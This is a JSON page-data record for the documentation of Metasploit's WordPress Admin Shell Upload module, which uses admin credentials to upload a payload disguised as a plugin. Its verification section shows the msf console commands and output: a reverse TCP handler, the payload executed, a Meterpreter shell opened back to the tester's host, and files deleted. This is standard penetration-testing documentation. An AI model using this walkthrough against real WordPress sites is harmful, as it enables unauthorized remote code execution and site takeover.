{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/exploit/unix/webapp/wp_admin_shell_upload","result":{"data":{"moduleMetadataJson":{"id":"bdeb63aa-6b49-566c-9929-8d180bd47b43","name":"WordPress Admin Shell Upload","fullname":"exploit/unix/webapp/wp_admin_shell_upload","description":"This module will generate a plugin, pack the payload into it\n          and upload it to a server running WordPress providing valid\n          admin credentials are used.","rank":600,"fields":{"detailsSlug":"/modules/details/exploit/unix/webapp/wp_admin_shell_upload","documentationSlug":"/modules/documentation/exploit/unix/webapp/wp_admin_shell_upload","referencesSlug":"/modules/references/exploit/unix/webapp/wp_admin_shell_upload"},"documentation":{"html":"<h2 id=\"vulnerable-application\" style=\"position:relative;\"><a href=\"#vulnerable-application\" aria-label=\"vulnerable application permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerable Application</h2>\n<p>This module takes an administrator username and password, logs into the\nadmin panel, and uploads a payload packaged as a WordPress plugin.\nBecuase this is authenticated code execution by design, it should work\non all versions of WordPress.</p>\n<h3 id=\"vulnerable-application-installation\" style=\"position:relative;\"><a href=\"#vulnerable-application-installation\" aria-label=\"vulnerable application installation permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerable Application Installation</h3>\n<p>You can get WordPress from <a href=\"https://wordpress.org/download/\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">https://wordpress.org/download/</a>\nor from some Linux package managers. <a href=\"https://wiki.debian.org/WordPress\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">Debian maintains an installation\nguide</a> that also works on Ubuntu.\nNote that in a default install of WP from apt, the plugins directory is\nowned by root, so unless you chown it to the web user, this module will\nnot work. Doing so is common in real-world deployments to allow\nlegitimate administrators to install plugins, so it is not unreasonable\nfor your own installation.</p>\n<h2 id=\"verification-steps\" style=\"position:relative;\"><a href=\"#verification-steps\" aria-label=\"verification steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Verification Steps</h2>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf &gt; use exploit/unix/webapp/wp_admin_shell_upload\nmsf exploit(wp_admin_shell_upload) &gt; set USERNAME admin\nUSERNAME =&gt; admin\nmsf exploit(wp_admin_shell_upload) &gt; set PASSWORD password\nPASSWORD =&gt; password\nmsf exploit(wp_admin_shell_upload) &gt; set TARGETURI /wp/\nTARGETURI =&gt; /wp/\nmsf exploit(wp_admin_shell_upload) &gt; run\n\n[*] Started reverse TCP handler on 0.0.0.0:4444\n[*] Authenticating with WordPress using admin:password...\n[+] Login successful\n[+] Authenticated with WordPress\n[*] Preparing payload...\n[*] Uploading payload...\n[*] Acquired a plugin upload nonce: afa507398f\n[*] Uploaded plugin iHNhrYLmGR\n[*] Executing the payload at /wp/wp-content/plugins/iHNhrYLmGR/DcrpFXPOCG.php...\n[*] Sending stage (33986 bytes) to 192.168.100.131\n[*] Meterpreter session 2 opened (192.168.100.1:4444 -&gt; 192.168.100.131:40039) at 2017-04-21 11:36:33 -0500\n[+] Deleted DcrpFXPOCG.php\n[+] Deleted iHNhrYLmGR.php\n\nmeterpreter &gt; pwd\n/var/lib/wordpress/wp-content/plugins/iHNhrYLmGR\nmeterpreter &gt;</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>"}}},"pageContext":{"id":"bdeb63aa-6b49-566c-9929-8d180bd47b43"}}}